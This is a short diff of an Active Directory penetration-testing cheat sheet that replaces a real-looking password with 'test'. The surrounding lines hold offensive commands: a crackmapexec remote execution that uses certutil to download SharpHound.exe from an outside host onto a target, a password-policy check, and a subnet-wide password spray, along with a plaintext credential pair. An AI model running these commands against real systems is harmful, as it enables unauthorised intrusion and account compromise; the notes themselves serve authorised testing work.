@@ -104,7 +104,7 @@ Performing Penetration Testing of Active Directory is more interesting and are m
     cme smb 10.128.111.203 -u 'xampp' -p '@sdF1234' -d HQCMSDBQ -x "certutil.exe -urlcache -split -f http://172.17.17.214/SharpHound.exe pentest/zz.exe"
 
     Check account lockout policy:
-    crackmapexec smb 192.168.1.101 -u syedali -p 'reptile125ZZZ'  --pass-pol
+    crackmapexec smb 192.168.1.101 -u syedali -p 'test'  --pass-pol
 
     Password spray:
     python crackmapexec.py 192.168.0.0/24 -u username -p 'password'
